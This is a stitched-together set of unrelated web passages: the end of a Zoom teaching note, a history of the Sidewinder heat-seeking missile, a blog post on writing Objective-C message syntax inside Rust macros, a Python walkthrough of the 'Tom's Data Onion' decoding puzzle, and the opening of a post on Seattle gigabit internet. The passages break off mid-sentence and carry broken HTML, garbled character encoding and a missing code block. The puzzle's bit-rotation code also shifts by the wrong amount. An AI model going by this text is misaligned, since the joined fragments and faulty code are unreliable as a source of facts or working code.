they need to learn. </p><p>For those looking to go the extra mile, here’s an intro to zoom video I made where I talk in more detail about the hardware I’ve chosen and some tips for beginner teachers on using zoom. </p></div></div></div>]]>

<span>T</span><p>he Cold War flared hot on August 23, 1958, when <a href="http://en.wikipedia.org/wiki/Second_Taiwan_Strait_Crisis" target="_blank">Communist China bombarded Matsu and Quemoy,</a> islands of the Nationalist Republic of China (Taiwan). As Red Chinese and American warships faced off in the Formosa Strait, Nationalist <a href="http://en.wikipedia.org/wiki/F-86_Sabre" target="_blank">F-86F Sabres</a> flew against MiG fighters, including the new <a href="http://en.wikipedia.org/wiki/MiG-17" target="_blank">MiG-17 “Fresco.”</a> Cruising above and beyond the reach of the Sabres’ machine guns—weapons that remained basically unchanged since the dawn of fighter aircraft—Fresco pilots enjoyed not only superior numbers but superior technology.
</p><p>
Or did they? In late September the Sabres took on new, American-supplied weaponry—needle-like, 9-foot-long rockets that were barb-tipped and finned, with delicate glass noses instead of steel warheads. The new rocket had no wires, no radio, no way for the pilot to guide it after launch. Yet it was equipped with movable fins. It could change course. For the Taiwanese pilots the conclusion was inescapable, if unbelievable: The Americans had created a missile that could seek out and destroy the enemy on its own.
</p>





<div><img src="http://www.donhollway.com/foxtwo/ex-0.jpg" width="967" height="311" alt=""><p><b>Prototype Sidewinder EX-O airframe at China Lake.<br>

<p>From the Allies’ unguided <a href="http://en.wikipedia.org/wiki/Le_Prieur_rocket" target="_blank">Le Prieur</a> of World War I to World War II’s wire-guided German <a href="http://en.wikipedia.org/wiki/Ruhrstahl_X-4" target="_blank">Ruhrstahl X-4</a>, air-to-air rockets had never proven particularly effective. After WWII, air combat was supposed to be all about intercepting nuclear-armed strategic bombers at long range. The experts fancied missiles with radar guidance, though this required launch planes to track and “paint” targets with microwaves throughout attack runs. 
</p><p>
Meanwhile, at the U.S. Naval Ordnance Test Station at <a href="http://en.wikipedia.org/wiki/China_Lake" target="_blank">China Lake</a> in California’s Mojave Desert, a few dozen gadgeteers under physicist William B. McLean were toying with lead-sulfide proximity fuzes that were sensitive to the infrared radiation generated by heat. China Lake’s directive was R&amp;D, not weapon design, and critics derisively referred to his lab as “McLean’s Hobby Shop.” But that didn’t stop his little team from completely revolutionizing air warfare.

</tr></tbody></table>


<p>
Reasoning that a fuze capable of exploding a warhead near a hot target could also be made to home in on it, McLean sought to put a guidance system entirely onboard a standard 5-inch air-to-ground rocket. With in-house volunteers, miscellaneous funds and spare time—but without official approval—he undertook to develop an intelligent fuze for a heat-seeking air-to-air missile.
</p><p>
It took five years. “I personally spent nearly three years [just] considering possibilities,” McLean later wrote. “It is easy to build something complicated; it’s hard to build it so that it’s simple.” 
</p><p>
The final design was indeed simple: a parabolic mirror spinning gyroscopically at 4,200 rpm inside the rocket’s transparent nose. The distance of an infrared blip’s reflection from the axis of spin indicated its angle-off; current from the centrally mounted lead-sulfide detector kept the “eye” on target via electromagnets around its rim and controlled the missile’s canard guide fins. 
</p><p>
Future astronaut <a href="http://en.wikipedia.org/wiki/Wally_Schirra" target="_blank">Wally Schirra</a>, then a hotshot Korea veteran with a MiG-15 kill to his credit, remembered his first visit to the lab. The China Lake eggheads had a “dome-shaped device, made of glass….a man-made eyeball,” he recalled. “I was a cigarette smoker in those days, and I had one in my hand. As I crossed the room, I noticed that the eyeball was tracking me.”

<p>
Since missile roll would interfere with the gyro’s spin, on the fly McLean’s team invented “rollerons”—tailfin-mounted, airstream-driven gyro wheels whose spin counteracted the missile’s. The crowning touch, however, was wiring the seeker to aim not where the target was, but <i>where it would be.</i> In dogfights the missile itself would take on enemy aircraft on their own terms: seek them out, run them down and outmaneuver them to make the kill. 
This can’t be overstated. More than 60 years ago, back when automobiles were lumbering hunks of Detroit steel, the proto-computer Eniac needed a room full of vacuum tubes merely to calculate ballistic trajectories and the only robots were costumed actors in sci-fi films, what Bill McLean’s China Lake team did—with just 14 tubes and fewer than 24 moving parts, in a package less than 10 feet long, 5 inches across and weighing 160 pounds—was invent fire-and-forget: an autonomous combat robot. They named it Sidewinder, after the <a href="http://en.wikipedia.org/wiki/Crotalus_cerastes" target="_blank">Mojave horned rattlesnake</a>, which stalks its prey by their heat signatures in darkness, and crosses the desert sands with a sinuous, winding motion not unlike the missiles’ corkscrewing trajectory.

</p><div><img src="http://www.donhollway.com/foxtwo/skynight.jpg" width="624" height="375">
<p><b>U.S. Navy Douglas F3D-2 Skyknight (BuNo 123744) fires a Sidewinder 1-C missile at the Naval Weapons Center (NWC) China Lake, California (USA), on 27 June 1961. The escorting plane is a McDonnell F3H-2N Demon (BuNo 133550).</b></p>
</div>


<p>
Schirra and other test pilots amused themselves by locking onto not only flying target drones, but also locomotives, tractor-trailers and Greyhound buses near China Lake. Their main complaint, since Sidewinder firing parameters varied with altitude, airspeed and G-load, was having to check a cockpit voltmeter to confirm lock-on: “We’ve got to get something besides the damn gauge. You can’t have a pilot, a fighter pilot in combat, looking [down] at funny little gauges to see if he can fire or not.”
</p><p>
It turned out to be the final piece of the puzzle. Anyone who’s flown a combat flight sim knows the 840 Hz Sidewinder “growl,” indicating missile readiness and target lock. (Newer versions chirp.) This robot doesn’t just think; it talks. 
</p><p>
Just five years later, under the code name <a href="http://en.wikipedia.org/wiki/Second_Taiwan_Strait_Crisis#Overview" target="_blank">“Operation Black Magic,”</a> Americans in <a href="http://en.wikipedia.org/wiki/F-100_Super_Sabre" target="_blank">F-100 Super Sabres </a>were simulating Red Chinese Frescos, teaching Nationalist pilots “pitch-up” Sidewinder launches against high-altitude targets. The MiG pilots were about to get a nasty surprise.

<p>
The final tally depends on which side does the counting, but on a single day, September 24, 1958, the Nationalists’ Sidewinder-equipped Sabres shot down at least 10 Frescos. Two weeks later the People’s Republic sued for peace. Command of the air, and thus the battlefield, had been handed back to the West, courtesy of the Sidewinder. Yet one MiG reportedly returned to base with an unexploded missile still embedded in its wing root. Thus despite the project’s top-secret nature, on its first outing the Sidewinder had been outed.
</p><p>
The Soviets, weapons suppliers to half the world, later admitted that the Sidewinder’s near-biological intelligence was a complete revelation to them. They set about reverse-engineering a copy—the <a href="http://en.wikipedia.org/wiki/AA-2_Atoll" target="_blank">K15, NATO code name AA-2 “Atoll”</a>—and devising tactics to defeat heat-seekers.
</p><p>
The Sidewinder, now designated Air Intercept Missile (AIM) 9, proved decisive once again when <a href="http://en.wikipedia.org/wiki/Second_Kashmir_War" target="_blank">Pakistan and India went to war for the second time over Kashmir in 1965.</a> The air battle was unique: primarily American versus British and French warplanes. The Pakistanis were outnumbered 5-to-1, but they had Sidewinders.

But before they could make good their escape, Khan used his speed to come back around into a Sidewinder envelope. “I aimed the missile at the nearest aircraft, and heard the loud pitched missile tone,” he recalled. “The sight indicated that I was in range. With all other requisite firing conditions met, I squeezed the trigger, and kept it pressed. I waited, only to note that the missile had not fired.

<p>Yep, thatâ€™s Rust code with embedded Objective-C syntax, and it works. Why would you do such a thing? Maybe you want tighter interop between the Rust and Objective-C parts of your iOS app. Maybe you want to write your iOS app <em>entirely</em> in Rust. Or maybe you just wanted to see if it was possible after your <a href="https://twitter.com/porglezomp">colleague</a>â€™s offhand remark.</p>

<p>(For me, it was the last one, absolutely.)</p>

<p>This post is going to walk through what it took to make this possible, so hereâ€™s a table of contents:</p>

<p>Sections 3-5 might actually be useful to other people looking to write Rust macros, so even though this project is a toy, you may still get something out of reading the post. However, if youâ€™re looking to use Objective-C from Rust in production, you should not be using my unsafe toy here. Instead, use Steven Sheldonâ€™s <a href="https://crates.io/crates/objc"><code>objc</code> crate</a>. Sheldon also has a blog post from near the start of the project that talks about <a href="https://sasheldon.com/blog/2014/11/28/interoperating-between-objective-c-and-rust/">his design process beyond the bare message-send implementation</a>.</p>

<p>That said, if you want to see the full source of my little monstrosity, you can <a href="https://belkadan.com/source/rust-inline-objc/">check out the repository</a>.</p>

<h2 id="background-on-objective-c">Background on Objective-C</h2>

<p>My normal audience these days is probably Swift developers, but I expect this one to make rounds with at least some Rust people as well. Itâ€™d be easy for both groups to not have much direct experience with Objective-C, the primary language used by Apple for both macOS<sup id="fnref:osx" role="doc-noteref"><a href="#fn:osx">1</a></sup> and iOS since their releases in 2001 and 2007. So, hereâ€™s the quick summary: itâ€™s â€œjustâ€� C, except when you start working with â€œobjectâ€� types. And nearly everything you do with those objects is based on a dynamic dispatch model implemented in the <em>runtime.</em> Because of the two parts of that sentence (â€œdynamic dispatchâ€� and â€œimplemented in the runtimeâ€�), people have come up with a lot of clever and powerful techniques to make programs simpler, more expressive, or more extensible, though sometimes at the cost of security, secrecy, and stability.</p>

<p>More relevant to us, however, is that a language whose features are (nearly) all available in a runtime library is a language thatâ€™s easy to bridge to dynamically, as long as you donâ€™t have really tight performance constraints. So hereâ€™s the deal: nearly everything you do in Objective-C is calling methods by <em>sending messages,</em> and the way this works is that methods are regular C functions stored in a dispatch table keyed by a uniqued string called a <dfn>selector</dfn>. It is likely that the most heavily-optimized piece of code in Appleâ€™s libraries is <code>objc_msgSend</code>, which takes a <dfn>receiver</dfn>, a selector, and the arguments to the method, does a (cached) lookup of the selector in the receiverâ€™s classâ€™s dispatch table(s), and then jumps directly to the appropriate, polymorphically-selected implementation of the method.</p>

<p>There are more things the Objective-C runtime exposes, but messages are absolutely the most important.</p>

<p>â€¦Oh, one more thing. Because Objective-C is an extension to C, it has to use syntax that doesnâ€™t conflict with C syntax. That means keywords with <code>@</code> signs in front of themâ€”one of the few symbols on the US keyboard that doesnâ€™t already have a meaning in Câ€”and a unique bracket-based â€œmessage sendâ€� syntax that takes a while to get used to:</p>

<pre><code>// Objective-C
NSString *fileStr = [[NSString alloc] initWithData:fileContents encoding:NSUTF8StringEncoding];

// Pseudo-Swift
let fileStr: NSString = NSString.alloc().initWithData(fileContents, encoding: NSUTF8StringEncoding)

// Actual Swift
let fileStr = NSString(data: fileContents, encoding: .utf8)

// Pseudo-Rust
let fileStr: *const NSString = NSString::alloc().initWithData(fileContents, NSUTF8StringEncoding)

// Idiomatic-ish Rust
let file_str = NSString::from_data(file_contents, NSStringEncoding::UTF8)
</code></pre>

<p>People almost universally think Objective-C syntax is ugly when they first see it, almost universally find it completely normal after a few years, and largely (though <em>not</em> almost universally) find idiomatic Swift easier to read even if theyâ€™re used to Objective-C.</p>

<h2 id="objective-c-from-rust-manually">Objective-C from Rust, manually</h2>

<p>From this point on youâ€™ll be expected to read Rust syntax without step-by-step explanations. Iâ€™ll try to explain whatâ€™s going on for my Swift and other non-Rust readersâ€”I myself am still a relative newcomer to Rustâ€”but itâ€™ll be pretty fast. This is <em>not</em> intended to be an introduction to Rust or Rust macros!</p>

<p>Given that the Objective-C runtime exposes a public API, we should be able to pretty much just call that from Rust, and indeed we can:</p>

</code></pre></div>

<p>Now, this code should make most Rust users pretty horrified. It starts out okay, declaring some types and then declaring the Rust versions of the C API from libobjc. Then itâ€™s got a funny empty extern block to link the Foundation framework, but sure, thatâ€™s fine. And itâ€™s got explicitly-null-terminated strings because thatâ€™s what C-based APIs generally use. (Rust doesnâ€™t guarantee null termination by default, which makes slicing a Rust string easier.)</p>

<p>But then thereâ€™s a monstrosity of a line involving <a href="https://doc.rust-lang.org/std/mem/fn.transmute.html"><code>std::mem::transmute</code></a>, Rustâ€™s equivalent of Swiftâ€™s <code>unsafeBitCast(_:)</code> or C++â€™s <code>reinterpret_cast</code> (and now <a href="https://en.cppreference.com/w/cpp/numeric/bit_cast"><code>bit_cast</code></a>) or Câ€™sâ€¦well, okay, C doesnâ€™t have a direct equivalent, but a plain old cast when youâ€™re talking about function pointers like this. The <a href="https://doc.rust-lang.org/std/mem/fn.transmute.html">docs for <code>transmute</code></a> even tell you to go use other things if possible.</p>

<p>So, what are we doing? Well, remember what I said about Objective-C and <code>objc_msgSend</code>: methods are regular C functions, and <code>objc_msgSend</code> â€œjumps directly to the appropriate, polymorphically-selected implementation of the methodâ€�. That means that the correct way to call <code>objc_msgSend</code> is to <em>pretend it has the right type for the method youâ€™re calling.</em></p>

<p>In C (and Swift, for that matter), that conversion would require explicitly specifying the type of all arguments and return values. But Rust has really powerful type inference within a function body, and that extends to specifying only <em>some</em> generic parameters, and leaving others out.<sup id="fnref:swift-inference" role="doc-noteref"><a href="#fn:swift-inference">2</a></sup> In this case I need to specify that weâ€™re casting to a C function pointer with two arguments and a non-void return, but not anything more than that. The remaining information will be filled in based on how the function pointer is used.</p>

<p>With that, you should understand the (cursed) code above. Go ahead. Try it on your own machine (if your machine is a Mac).</p>

<h2 id="recursive-rust-macros">Recursive Rust macros</h2>

<p>Rust has a pretty robust macro system, so it wouldnâ€™t be impossible or even too hard to make a macro for â€œmessage sendâ€�. Thatâ€™s the route that the <a href="https://crates.io/crates/objc"><code>objc</code> crate</a> takes:</p>

<div><pre><code><span></span><span>let</span><span> </span><span>url_class</span><span> </span><span>=</span><span> </span><span>class</span><span>!</span><span>(</span><span>NSURL</span><span>);</span><span></span>
<span>let</span><span> </span><span>description_obj</span>: <span>*</span><span>mut</span><span> </span><span>Object</span><span> </span><span>=</span><span> </span><span>msg_send</span><span>!</span><span>[</span><span>url_class</span><span>,</span><span> </span><span>description</span><span>];</span><span></span>
<span>let</span><span> </span><span>utf8_ptr</span><span> </span><span>=</span><span> </span><span>msg_send</span><span>!</span><span>[</span><span>description_obj</span><span>,</span><span> </span><span>UTF8String</span><span>];</span><span></span>
<span>println</span><span>!</span><span>(</span><span>"{}"</span><span>,</span><span> </span><span>CStr</span>::<span>from_ptr</span><span>(</span><span>utf8_ptr</span><span>).</span><span>to_string_lossy</span><span>());</span><span></span>
</code></pre></div>

<p>But while thatâ€™s clearly the right choice for serious Rust work, I wanted something more ambitious. More integrated. Moreâ€¦ridiculous.</p>

<blockquote data-dnt="true"><p lang="en" dir="ltr">wait a minute. this is just objective-c <a href="https://t.co/dVQMYKKVTI">pic.twitter.com/dVQMYKKVTI</a></p>— Harlan Haskins (@harlanhaskins) <a href="https://twitter.com/harlanhaskins/status/1133210047952015360?ref_src=twsrc%5Etfw">May 28, 2019</a></blockquote>


<p>What I wanted was for Objective-Câ€™s messaging syntax, or something like it, to be valid anywhere in Rust code. It didnâ€™t have to be exactly Objective-C, but I quickly realized the <em>advantage</em> of Objective-Câ€™s syntax: itâ€™s delimited, i.e. itâ€™s a self-contained expression that can be dropped into something larger without changing how that larger thing parses. (Thatâ€™s probably why itâ€™s bracketed in C as well.) Within the brackets, thereâ€™s basically two forms:</p>

<pre><code>[receiver-expr no-arg-selector]
[receiver-expr selector-piece:arg-expr selector-piece:second-arg-expr...]
</code></pre>

<p>If I were <em>just</em> matching that, I could use Rustâ€™s original <a href="https://doc.rust-lang.org/book/ch19-06-macros.html#declarative-macros-with-macro_rules-for-general-metaprogramming">pattern-matching macros</a>. But to take a whole block of code, and replace everything that looks like a message lock <em>in</em> that blockâ€¦well, it might be possible with pattern-matching and quite a bit of recursion, but itâ€™s going to be a lot easier to use <em><a href="https://blog.rust-lang.org/2018/12/21/Procedural-Macros-in-Rust-2018.html">procedural macros</a>,</em> a Rust macro interface written in Rust and used as a compiler plugin. (Swift folks, basically what <a href="https://github.com/apple/swift-syntax">SwiftSyntax</a> allows you to do, but invoked on-demand during compilation.)</p>

<p>A couple of months ago I came across a programming puzzle called
<a href="https://www.tomdalling.com/toms-data-onion/">Tom’s Data Onion</a>.</p>

<p>The puzzle looked interesting because solving one layer of the puzzle
lets you access further layers, for a total of 6 puzzles.</p>

<p>This write up will cover solving version 1.0 (released 2020-06-11)
and version 1.1.3 (released 2020-08-06) of the puzzles using python.</p>



<p>Each puzzle shares the follow qualities:</p>

<li><p>They all have a marked <code>==[ Payload ]====...</code> section where the
puzzle data is stored.</p></li>

<li><p>The puzzle data is always encoded using Adobe ASCII85.</p></li>
</ul>

<p>For that reason, I created common functions to extract and decode that
section:</p>

<pre><code>def extract_payload(data: str) -&gt; str:
    # The payload is bound by `&lt;~` and `~&gt;`
    start = '&lt;~'
    end = '~&gt;'
    # Match all characters or linebreaks.
    match = re.search(f'{start}(.|\n)*{end}', data, re.MULTILINE)
    if match:
        found = match.group(0)
    else:
        raise Exception("No payload.")
    return found

def read_current(idx: int) -&gt; str:
    path = pathlib.Path(__file__).parent / f'stage-{idx}.txt'
    with open(path, 'r') as f:
        data = f.read()
    encoded = extract_payload(data)
    decoded = base64.a85decode(encoded, adobe=True)
    return decoded
</code></pre>

<h2 id="layer-0">Layer 0</h2>

<p>Layer 0 is the most straightforward. The payload is encoded ASCII85.
Decoding it gives us the next layer without any further processing
needed.</p>

<h2 id="layer-1">Layer 1</h2>

<p>Layer 1 requires us to iterate over the payload byte by byte and
perform the following bit operations on it:</p>

<blockquote>
<p>Flip every second bit<br>
Rotate the bits one position to the right</p>
</blockquote>

<p>This function will take care of that:</p>

<pre><code>def stage_1(decoded: str) -&gt; str:
    flip_mask = 0x55
    output = ''

    for b in decoded:
        # 1. Flip every second bit (high to low).
        # 2. Rotate the bits one position to the right, fill the
        # highest with the lowest bit as a result of the rotation.
        flipped = b ^ flip_mask
        shifted = flipped &gt;&gt; 0x1
        # Put the lowest order bit back into the highest spot.
        shifted |= ((flipped &amp; 0x1) &lt;&lt; 0x8)
        # Each byte should be convertible to an ascii character.
        output += chr(shifted)
    return output
</code></pre>

<h2 id="layer-2">Layer 2</h2>

<p>This layer is slightly more complicated. It requires us to once again
iterate over the data and do bit operations. This time, the data
contains some metadata in the form of a parity bit. We need to check
the parity bit and discard any data that doesn’t pass the check.
Here is how we know:</p>

<blockquote>
<p>To determine if the parity bit is correct, first count how<br>
many 1 bits exist within the seven data bits. If the count<br>
is odd, the parity bit should be 1. If the count is even,<br>
the parity bit should be 0.</p>
</blockquote>

<p>To solve this, I iterated over all the bytes, then within each byte
iterated over each bit and summed them. It was then possible to check
the parity bit:</p>

<pre><code>bits = []

for b in decoded:
    # Lowest order bit is a parity bit. If the count of the
    # seven highest bits is even, parity bit is 0. If the count
    # is odd, parity bit is 1. Discard bytes with an incorrect
    # parity bit.
    bit_sum = 0
    candidate_bits = []

    for bit_idx in range(0x7, 0x0, -0x1):
        # High to low bit, ignoring the parity bit.
        bit = (b &amp; (0x1 &lt;&lt; bit_idx)) &gt;&gt; bit_idx
        bit_sum += bit
        candidate_bits.append(bit)

    parity_bit = b &amp; 0x1
    expected_parity = 0x0 if bit_sum % 2 == 0 else 0x1
    if parity_bit == expected_parity:
        bits.extend(candidate_bits)
</code></pre>

<p>If the check passed, I kept the non-parity bits (i.e. our data) in its
own buffer (<code>bits</code>). This was then used to generate the next payload:</p>

<pre><code>output = ''
# https://stackoverflow.com/a/32284957
for i in range(0, len(bits), 8):
    output += chr(int("".join(map(str, bits[i:i + 8])), 2))
</code></pre>

<p>There is probably a cleaner way to do this, but it worked just fine.</p>

<h2 id="layer-3">Layer 3</h2>

<p>I thought this was the most fun puzzle, even if it wasn’t the hardest
one. This stage involves XOR encryption using a cycling key:</p>

<blockquote>
<p>The payload has been encrypted by XOR’ing each byte with a<br>
secret, cycling key. The key is 32 bytes of random data,<br>
which I’m not going to give you. You will need to use your<br>
hacker skills to discover what the key is, in order to<br>
decrypt the payload.</p>
</blockquote>

<p>If you do some research on this form of encryption, you’ll quickly find
out that it can be beat with frequency analysis. However, we can keep
things even simpler because we already have a sense of what the decrypted
data looks like.</p>

<p>For example, each puzzle so far has had a predictable header that looks
like this:</p>

<pre><code>==[ Layer N/5: PUZZLE_NAME ]=============================
</code></pre>

<p>For this exercise, we know that it’ll be named <code>==[ Layer 4/5:</code> to begin
with. We don’t know the name of the puzzle yet. We also know that it will
end in some number of <code>=</code> characters and two line breaks (<code>\n\n</code>).</p>

<p>We can recover part of the key by XORing what we think the original
value is with the ciphered values:</p>

<pre><code>_REMAINDER = '=============================\n\n'

def _analyze_known_value(ciphered: str) -&gt; None:
    title_end_xor = ciphered[32:64]
    partial_key = []
    for r1, r2 in zip(_REMAINDER, title_end_xor):
        k = ord(r1) ^ r2
        partial_key.append(k)
</code></pre>

<p>We can then apply what we’ve found to the first chunk of the title,
bytes 0-32 and get a partial title:</p>

<pre><code>==[ Layer 4/5: Network Traff^c}
</code></pre>

<p>Now that we found the unknown name of the puzzle (<code>Network Traffic</code>),
we can recovery entire key by once again XORing what we think the
original text was with the ciphered text:</p>

<pre><code>_TITLE = '==[ Layer 4/5: Network Traffic ]'

def _extract_key(ciphered: str) -&gt; list:
    key = []
    title_xor = ciphered[0:32]
    for t1, t2 in zip(_TITLE, title_xor):
        k = ord(t1) ^ t2
        key.append(k)
    return key
</code></pre>

<h2 id="layer-4">Layer 4</h2>

<p>This layer’s data comes in the form of good and bad UDP packets.
To get the next payload, we have to remove any UDP packets whose:</p>

<ul>
<li>FROM address isn’t 10.1.1.10</li>
<li>TO port isn’t 42069</li>
<li>TO address isn’t 10.1.1.200</li>
<li>IPv4 and UDP header checksums fail</li>
</ul>

<p>We can use the following resources to implement these checks:</p>

<ul>
<li><a href="https://en.wikipedia.org/wiki/IPv4_header_checksum#Verifying_the_IPv4_header_checksum">Verify the IPv4 header checksum</a></li>
<li><a href="https://en.wikipedia.org/wiki/User_Datagram_Protocol#UDP_datagram_structure">Check the source and destination ports and addresses</a></li>
<li><a href="https://stackoverflow.com/questions/45908909/my-udp-checksum-calculation-gives-wrong-results-every-time/45925573#45925573">Verify the UDP header checksum</a></li>
<li><a href="https://www.securitynik.com/2015/08/calculating-udp-checksum-with-taste-of.html">Test the UDP header checksum verification</a></li>
</ul>

<p>If all of the above is implemented correctly, we should get the right
data. The source code to solve this isn’t included inline because it’s
too long. Instead, it’s available at the end.</p>

<h2 id="layer-5">Layer 5</h2>

<p>This stage’s data is encrypted using AES-256 in CBC mode. We are given
the key and the initialization vector. However, the key itself is also
encrypted using AES key wrap, which itself has a decryption key called
a key encrypting key (KEK).</p>

<p>Implementing the decryption and key unwrapping manually would be too much
of a pain. Thankfully, the <a href="https://pypi.org/project/aes-keywrap/"><code>aes-keywrap</code></a>
package will do that work for us. The AES decryption is then handled using
<code>AES</code> from <code>Crypto.Cipher</code>. Because most of this is handled by 3rd party
code, the solution is pretty short:</p>

<pre><code>import struct

from Crypto.Cipher import AES
from aes_keywrap import aes_unwrap_key


def handle_encrypted_data(decoded: str) -&gt; str:
    key_encrypting_key = decoded[0:32]
    wrapped_key_iv = struct.unpack('&gt;Q', decoded[32:40])[0]
    wrapped_key = decoded[40:80]
    payload_iv = decoded[80:96]
    payload = decoded[96:]

    unwrapped_key = aes_unwrap_key(
        key_encrypting_key,
        wrapped_key,
        iv=wrapped_key_iv
    )

    cipher = AES.new(unwrapped_key, AES.MODE_CBC, payload_iv)
    decrypted = cipher.decrypt(payload)
    return decrypted.decode('ascii')
</code></pre>

<h2 id="version-1-1-3">Version 1.1.3</h2>

<p>There are three differences between this version and version 1.0.</p>

<p>First, on layer 3, our known value no longer starts like this:</p>

<pre><code>==[ Layer 4/5:
</code></pre>

<p>Because a new layer was added we now need to update it to this:</p>

<pre><code>==[ Layer 4/6:
</code></pre>

<p>Second, on layer 5, we need to update the encryption mode since it
now uses CTR instead of CBC. Here is a contrast between the versions
to show the impact on the code:</p>

<pre><code>cipher = AES.new(unwrapped_key, AES.MODE_CBC, payload_iv)
</code></pre>

<pre><code>counter_obj = Counter.new(
    128,
    initial_value=int.from_bytes(payload_iv, byteorder='big'),
    little_endian=False
)

# unwrapped_key and payload_iv can be used to decrypt the
# rest of the payload.
cipher = AES.new(
    unwrapped_key,
    mode=AES.MODE_CTR,
    counter=counter_obj
)
</code></pre>

<p>Third, a 6th layer has been added before we reach the end. The next
section provides the solution.</p>

<h2 id="layer-6">Layer 6</h2>

<p>This layer’s data comes in the form of custom machine code that we need
to write an emulator or virtual machine to execute. If we run it correctly,
then it will output the last layer (i.e. the result of the puzzle).</p>

<p>Like layer 4, the source code isn’t included in line because it’s too
long. However, there are a few interesting qualities I want to call out.</p>

<p>For starters, the entire “memory” content is the code we’re executing. It is
also fully readable, writable, and executable. In theory this means that the
code could overwrite pieces of itself as it’s executing (i.e. it could be
polymorphic). I’m not sure if this happens in practice, but it’s an interesting
detail.</p>

<p>On top of that, the program counter register (<code>pc</code>) is directly mutable. There
was a gotcha here because after executing an instruction, we need to increment
the <code>pc</code> register to find the next instruction. Each opcode is 1 byte,
but some are immediate mode and contain their data in line. For example,
moving a value into <code>pc</code> looks like this:</p>

<pre><code>B0 29 00 00 00  # MVI32 pc &lt;- 0x00000029
</code></pre>

<p>As a result, I thought after doing this operation I would need to increment <code>pc</code>
by 5 bytes to get to the next instruction. This was a bug, because we already
overwrote <code>pc</code> and thus have its next value without also incrementing it.</p>

<p>A final detail to call out was this pseudo-register:</p>

<blockquote>
<p><code>(ptr+c)</code>  Memory cursor – Used to access one byte of<br>
              …</p></blockquote></div></section></article></div></div>

            <p>WiFi that just works with multiple mounted access points. Symmetric 1000 Mbps 
symmetric gigabit Internet. Centrally managed enterprise network gear. Pulling 
new CAT6 while dealing with old CAT3 in a condo.</p>

<p>This is my story, long overdue, about some of the experiences, challenges, and 
information about the connectivity tech I enjoyed at home. I love not having to 
worry about my WiFi ever having issues, even in the dense city, thanks to 
enterprise-grade gear.</p>

<p>In Seattle we’re lucky to have broad access in apartments/condominiums to
gigabit Internet from providers such as 
<a href="https://waveg.wavebroadband.com/">Wave G</a> (a.k.a. CondoInternet). Having a 
zippy connection without bandwidth caps means that I’m free to stream 4K content,
backup my on-premise storage to the cloud, and not worry about keeping 
operating system installation disc images around.</p>

<p>My building’s gigabit is provided by a 10G fiber link to a data center just a 
few blocks away, which then has its own 40G link to classic peering location in
Seattle - . Our rooftop also has several 60GHz millimeter wave radio links, 
available either as backup or to serve nearby buildings. In this post 
I wanted to share how that infrastructure is deployed in my condo building.</p>

<p>With fiber to our building there are minimal hops between major cloud 
providers and big networks thanks to the many peering opportunities in downtown
Seattle. The 
<a href="https://www.westinbldg.com/">Westin Building Exchange</a> carrier hotel/colo is 
home to the important non-profit 
<a href="https://www.seattleix.net/">Seattle Internet Exchange</a>, moving terabits per second, 
with a transparent approach that lets you peek at their stats, story and customers.</p>

<p>Having fast Internet creates pressure to be able to move a lot of packets to 
take advantage of the speed, and that’s where enterprise-grade managed network
equipment comes in. There’s a lot of value in the data and featureset of the 
UniFi line from <a href="https://www.ubnt.com/">Ubiquiti Networks</a> when it comes to 
routing, switching, and access points.</p>

<p>I’ve been running a Ubiquiti network at home for over 2 years and have been very
happy with that investment.</p>

<p>Finally, I wanted to document some of the challenges with old CAT3 and 
pulling new pulling CAT6 within the constraints of my condo building, mostly to
share my pain.</p>

<p>Apologies in advance, this post is full of up-optimized images and is much too
long.</p>

<p><small>Disclaimer:<br>
I’m a tech enthusiast in this space but don’t represent any of the companies 
mentioned. While my initial Ubiquiti buildout in Feb. 2016 was my own, in 
Dec. 2017 I was provided a demo AC-HD access point to evaluate. 
I’ve since purchased my own AC-HD.</small></p>

<p><strong>4/15/18 update:<br>
Through follow-up conversations on Twitter following this post, I discovered 
something amazing: our building was originally provided Internet through 
millimeter wave, and still has it as a backup and to provide coverage to other 
nearby buildings, but our building is actually connected directly through a 
10 Gigabit fiber link. Cool!
</strong></p>

<p><strong>4/16/18 update:<br>
Wave G (Spectrum and family) actually has at least 1x 100 Gbit fiber connection 
to the SIX, soon to have a second.
</strong></p>

<!-- ---------------- WAVE G ---------------- -->



<p>Even today, I remember a conversation with my friend Alex a decade ago when 
15 Mbps down, 2 Mbps up cable Internet was a common offering from Comcast and 
competitors, and if you used DSL, it’d be even slower.</p>

<blockquote>
  <p>Alex (in 2008): “My apartment building just got CondoInternet. 100 Mbps up and down, no caps or contracts.”</p>

  <p>Jeff: “That’s hard to believe, that’s like what I had in my university dorm room, but no commercial providers offer that sort of speed. There must be caps or something. It can’t be  that fast!”</p>

  <p>Alex: “It’s true, and I hear you can also get a 1000 Mbps connection. This is the future.”</p>
</blockquote>

<p>Alex was right, I was wrong. 
If you live in an apartment or condo in Seattle, chances are you’re reading this 
via your <a href="https://waveg.wavebroadband.com/">Wave G</a> connection, but for those 
that are not familiar with the service, this is a primer.</p>

<p>Wave G, formerly known as CondoInternet before being acquired by the Wave 
conglomerate, was founded a decade ago by techies who ran their own wholesale 
bandwidth business and wanted to have fast Internet at home in their condos.</p>

<p>Today, the Wave G gigabit product is the gold standard for everyone from tech 
employees working from home to being the best ISP in town to stream content with.
It’s basically the opposite of Comcast: no contracts, no upward pricing pressure,
quick service, no cable modem required, no bundling.</p>

<p>If your multi-family building is connected to Wave G (hundreds are), often you
only need to make a phone call and patch your unit’s home run network cable 
to your router or computer.</p>

<p>From the home run, a nearby comms closet holds Wave G’s managed switch equipment,
at which point you’re on their network: fiber from our building runs to a 
nearby data center, then Seattle’s central peering fiber hotel.</p>

<h2 id="locations">Locations</h2>

<p>Wave G is available today in several cities in Western Washington including 
Seattle, Bellevue and Everett; Portland, Oregon; and in California, Roseville 
and then San Francisco all the way to San Jose.</p>

<p><img src="https://az414997.vo.msecnd.net/waz/2018network/wave-locator.png" title="A screenshot of the Wave G service locator"></p>

<p>There’s some competition, too - while Wave acquired a previous similar company,
Cascadelink, Google Fiber’s Webpass is available in the neighborhood,
and I’m seeing more expansion there. Wave was recently purchased by a 
leveraged buyout and investment firm, TPG Capital, and I’m interesting to see 
what happens to the service. Hopefully no change.</p>

<h2 id="pricing">Pricing</h2>

<p>If you pay for gigabit, Wave G configures your switch port for full duplex 
1000 Mbps negotiation; otherwise your link will negotiate to 100 Mbps.</p>

<p>The pricing as far as I can remember has been $60/month for 100 Mbps 
or $80/month for 1000 Mbps. A few years ago gigabit was double the price of the 
hundred megs, so there was a price reduction.</p>

<h2 id="most-of-the-web-is-slow">Most of the web is slow…</h2>

<p>While you can stream 4K content just fine without buffering, or download an OS 
image in seconds, at home you don’t really need a gigabit connection for most 
